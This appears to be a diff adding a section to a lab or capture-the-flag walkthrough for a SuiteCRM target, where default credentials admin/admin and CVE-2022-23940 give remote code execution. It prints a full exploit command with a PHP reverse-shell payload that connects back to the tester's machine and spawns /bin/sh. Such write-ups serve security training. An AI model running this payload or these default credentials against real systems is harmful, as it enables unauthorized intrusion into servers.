@@ -71,7 +71,23 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Available ports ==🟡 22, 80, 3306, 33060 ==
 
+After some light credential work, we are able to access the machine with the login creds admin admin. The target IP Address opens into a SuiteCRM login page which can be accessed. 
+
 # Service Enumeration
 
+ After some manual research into SuiteCRM vulnerabilities, there appears to be a known CVE 
+ (CVE-2022-23940) that allows remote code execution (RCE) on the target address if credentials are known. 
+
+For this exploit we used the script developer on this public Gitlab -> https://github.com/manuelz120/CVE-2022-23940
+
+After downloading the proper python libraries, we are able to run the below payload with our specific local host and port to create a remote shell into the target machine.
+
+	python3 exploit.py -h http://192.168.150.146 -u admin -p admin -P "php -r '\$sock=fsockopen(\"192.168.XXX.XXX\", 80); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+
+*This payload example can be found on the gitlab and utilizes a php reverse shell command.
+
+With success, we are able to achieve a foothold on our local machine logged in as the user "www-data."
+
+The local.txt file can be found in the home directory of the user.
 
 # Privilege Escalation
